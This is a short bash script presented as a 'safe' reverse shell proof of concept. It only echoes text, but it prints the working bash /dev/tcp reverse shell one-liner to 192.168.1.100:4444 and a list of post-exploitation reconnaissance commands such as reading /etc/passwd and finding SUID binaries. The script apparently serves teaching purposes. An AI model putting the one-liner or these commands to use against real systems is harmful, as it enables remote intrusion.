#!/bin/bash
#
# PoC Reverse Shell Payload (SAFE VERSION - only shows what it WOULD do)
# This demonstrates the technique without actually being harmful
#

TARGET_IP="192.168.1.100"
TARGET_PORT="4444"

echo "================================"
echo "REVERSE SHELL PoC (Safe Mode)"
echo "================================"
echo ""
echo "[!] In a real attack, this would establish a reverse shell:"
echo ""
echo "    bash -i >& /dev/tcp/$TARGET_IP/$TARGET_PORT 0>&1"
echo ""
echo "    This would give the attacker:"
echo "    - Interactive shell access"
echo "    - Full command execution"
echo "    - Ability to escalate privileges"
echo "    - Data exfiltration capability"
echo ""
echo "[*] Connection would be made to:"
echo "    IP: $TARGET_IP"
echo "    Port: $TARGET_PORT"
echo ""
echo "[+] But this is just a PoC, so no actual connection is made!"
echo ""

# Show what commands would be run
echo "[*] Typical post-exploitation commands:"
echo "    1. id                    # Check user privileges"
echo "    2. uname -a              # Get system info"
echo "    3. cat /etc/passwd       # Enumerate users"
echo "    4. ss -tlnp              # Check open ports"
echo "    5. crontab -l            # Check scheduled tasks"
echo "    6. find / -perm -4000    # Find SUID binaries"
echo ""
echo "================================"
echo "PoC Demonstration Complete!"
echo "================================"
